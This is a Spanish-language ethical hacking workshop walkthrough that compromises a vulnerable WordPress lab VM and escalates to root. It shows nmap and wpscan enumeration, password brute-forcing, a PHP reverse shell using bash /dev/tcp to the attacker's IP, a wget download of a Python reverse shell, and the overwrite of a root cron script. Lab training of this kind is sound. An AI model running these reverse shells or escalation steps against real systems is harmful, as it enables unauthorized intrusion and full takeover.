
![](http://cms-site.inacap.cl/Assets/portal/img/logo-negro.png)

# Taller de Hacking Ético - Los Ángeles - Julio 2018. 

El fin de este taller práctico consiste en dar a conocer ciertas técnicas que permiten vulnerar la seguridad de serviodes/servicios. Con ello poder dotar del conocimiento necesario para que los asistentes, puedan asegurar su propia infraestructura. Este taller es desarrollado solo con fines educacionales.

Particularmente se trabajará con los siguientes recursos:

1. Un equipo capaz de correr dos máquinas virtuales.
1. 20 GB de espacio libre en Disco.
1. VirtualBox Pre-Instalado.
1. [Kali Linux](https://www.kali.org/downloads/) para su arquitectura.
1. Maquina virtual Vulnerable [Descarga](https://www.dropbox.com/s/j3r9l7kaydwsdm9/BSides-Vancouver-2018-Workshop.ova)
1. Las máquinas virtuales deben estar en una red común para poder conectarse.

El objetivo principal consiste en ganar permisos de super usuario (ROOT) sobre la máquina victima.

Dentro de un proceso de análisis de vulnerabilidades, es necesario seguir una metodología que permita hacer que el proceso sea repetible. Por ello, el ataque se separa en las siguientes fases Recolección/Enumeración, Análisis, Explotación y Documentación.

## Fase de Recolección de Información y Enumeración

Dentro de esta fase, es necesario tener en cuenta los datos de la máquina atacante como de la victima. Lograr la mayor cantidad de información del objetivo mediante la obtención de datos desde fuentes abiertas como desde escaneos pasivos y activos.
En este caso particular, trabajamos con una máquina virtual, por lo que pasaremos directamente al escaneo activo.
Desde el punto de vista del atacante es necesario conocer la IP del segmento de red al que está conectado. Una vez obtenida esa IP podemos revisar otras IPs correspondientes a máquinas vulnerables.
El comando en Linux para revisar la IP es: `ifconfig` este comando debe ser ejecutado en una consola de comandos, tal como se muestra a continuación.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/1-ifconfig.gif)

Una vez que ya tenemos nuestra propia IP, debemos revisar nuestro entorno de red mediante la famosa herramienta nmap.
Usamos el comando en consola de la siguiente manera:

`# nmap 10.0.2.0/24 -T4 -sS`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/2-nmapRed.gif)

Recordar que los parámetros `-T4` hacen un escaneo rápido y `-sS` permite identificación de servicios asociados a los puertos.
Como podemos ver en la salida del comando, se encontró la IP `10.0.2.8` con 3 puertos abiertos: `21, 22 y 80`.
Como primer paso abrimos un navegador en Kali Linux y verificamos el sitio existe en la IP victima (puerto 80).

Lo único que encontramos, es la típica página indicando que existe un servidor web y se encuntra funcionando.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/3-webhttp.gif)

Luego, entramos a verificar si existen archivos interesante en el servidor http. Esto se hace mediante el conjunto de herramientas o scripts del mismo nmap.
usaremos el comando siguiente: `# nmap -script http-enum 10.0.2.8`

Este comando nos permite enumerar mediante fuerza bruta, los archivos presentes en el sitio web.

Si miramos con atención la salida del comando, nos damos cuenta que hay un archivo denominado `robots.txt`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/4-http-enum.gif)
 
Una vez más, abrimos el navegador e introducimos la siguiente URL`10.0.2.8/robots.txt`.
Es importante recordar que el archivo robots.txt se deja en los servidores web, como manera de indicarle a los motores de búsqueda que NO indexen el contenido presente en dicho documento.

Finalmente comprobamos la existencia de un Wordpress hosteado en la máquina victima.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/5-robotsTxt.png)

El sitio wordpress se encuentra en `10.0.2.8/backup_wordpress`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/6-WordPress.png)

## Fase de Análisis
Bueno, a esta altura ya conocemos nuestra IP `10.0.2.5` y la IP de la victima `10.0.2.8`, además sabemos que hostea un sitio en wordpress. También se nos indica que el wordpress está desactualizado.

Acá comenzamos a planear la estrategia y los diferentes escenarios de ataques. 
Como sabemos, wordpress es una herramienta que permite implementar blogs y sitios de manera simple. Adicionalmente permite ser extendido mediante el uso de diferentes plugins. Muchas veces esos plugins introducen brechas de seguridad al ser instalados o simplemente se usan contraseñas débiles para acceder a la administración del Wordpress `10.0.2.8/backup_wordpress/wp-admin`.

Dentro de la distribución Kali Linux existe una herramienta denominada WPSCAN que nos permitirá auditar el sitio wordpress.
Justamente esto utilizaremos en la etapa de explotación.

## Fase de Explotación

Mediante WPSCAN procedemos a auditar el sitio worpress usando los parámetros específicos para enumerar usuarios.

`# wpscan -u 10.0.2.8/backup_wordpress --enumerate u`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/7-enumeracionUsuarios.gif)

La herramienta nos entrega dos usuarios y sus respectivas contraseñas:

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/8-UsuariosWP.png)

Intentamos loguearnos en `10.0.2.8/backup_wordpress/wp-admin` pero ninguno de los usuarios y sus respectivas contraseñas funcionan.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/9-LoginWordpress.png)

Pero como ya tenemos los usuarios, procedemos a implementar un ataque de fuerza bruta. 
Nos ayudamos de la misma herramienta WPSCAN para proceder con este ataque, sobre el usuario Admin.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/10.1-bruteforceAdmin.gif)

Acá queda de manifiesto que no existe una constraseña que nos permita ingresar con la cuenta `admin`.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/10.2-bruteforceAdmin.png)

Ahora procedemos a probar con el otro usuario `john`.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/11-password.png)

Acá si tenemos éxito, logrando la clave `enigma` para el usuario `john`

Procedemos a loguear en la administración del sitio wordpress con el usuario y clave ingresado.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/12-accesoWP.png)

Entramos al editor del tema de wordpress. Acá podemos modificar los archivos PHP directamente en el navegador web.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/13-EditorWP.png)

Ponemos un regalito [Shell reversa para php](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) en el `comments.php` y guardarmos el archivo. La shell reversa que usaremos es un trozo de código PHP que se ejecutará en la máquina victima. Una vez que visitemos uno de los comentarios del Wordpress ese trozo de código intentará conectarse a la máquina atacante `10.0.2.5` en un puerto específico `1234`. Para ello debemos preparar un listener en la máquina atacante que recibirá y manejará la conexión remota.

La shell reversa en PHP es: `exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/1234 0>&1'");`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/14-ShellReversaPhp.png)

Finalmente recibimos la conexión remota en el Kali Linux mediante el siguiente comando:
`nc -lvp 1234`.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/15-AccesoShell.gif)

Como ya contamos con acceso a la máquina victima, estamos un paso mas cerca de nuestro objetivo: Ser Root!
Para ello se deben utilizar técnicas de [escalación de privilegios](https://www.icann.org/news/blog/que-es-el-escalonamiento-de-privilegios). Para tratar de acortar un poco este material que ya es bastante extenso, diré que dentro de los sistemas operativos Linux, existen tareas recurrentes que se automatizan haciendo uso de Cron. Este proceso toma archivos y los ejecuta cada cierto periodo de tiempo. Resulta que en el caso de nuestra victima, existe un archivo que ha sido puesto para borrar logs. Estos logs son borrados recurrentemente. El gran problema reside en que ese archivo cuenta con permisos elevados, de hecho permisos de super usuario o root y puede ser modificado por cualquiera.

El archivo se encuentra en el directorio: `/usr/local/bin/cleanup`

Con la conexión reversa ya establecida, procedemos a utilizar el comando cat para visualizar el contenido del archivo

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/16-Cleanup.png)

Entonces usaremos este archivo para generar una shell reversa con los persmisos de root. Para lograr este cometido, debemos pasar un archivo con la shell reversa en Python y luego reemplazar el contenido del archivo cleanup con la shell reversa.

Para pasar el archivo, levantamos un servidor http en Kali Linux mediante la instrucción `service apache2 start` y procedemos a crear un archivo con el código fuente en Python de una shell reversa, que apunte a la IP `10.0.2.5` y al puerto `1111`.

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/17-ShellReversaPython.png)

Haciendo uso de la conexión inicial, en el puerto 1234, procedemos a descargar la shell reversa mediante el comando wget de la siguiente manera: `wget 10.0.2.5/srpython`.
Una vez que contamos con el archivo en el `/var/www` de la victima, procedemos a sobre-escribir el archivo cleanup, de la siguiente manera: `cp srpython /usr/local/bin/cleanup`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/18-SetReverseShell.png)

Cuando ya tenemos el archivo modificado, devemos abrir un listener mediante netcat para recibir la conexión entrante.
El comando para realizar esto es: `nc -lvp 1111`.
Como podemos ver luego de un par de segundos, es que recibimos correctamente la conexión y YA SOMOS ROOT!

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/19-whoami.gif)

Ahora como ya somos root, podemos incluso cambiar la clave de este usuario:

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/20-cambioClaveRoot.gif)

Y por último ingresamos directamente a la Máquina virtual, mediante el usuario `root` y la clave que seteamos: `password`

![](https://github.com/academiasIT/ciberseguridad/blob/master/img/21-root.gif)

## Fase de Documentación

En esta fase, se presenta un documento formal, como este mismo, presentando las evidencias y dando a entender los procesos y/o fallas descubiertas con el fin de ser solucionadas. En este caso la recomendación es usar claves mucho más complicadas, dado que esto impide o relentiza el proceso de fuerza bruta.

# ESTO ES EL FIN

Cualquier duda, me contanctan en twitter en: @agustin_salas_f
[Universidad Tecnológica de Chile INACAP](http://www.inacap.cl).
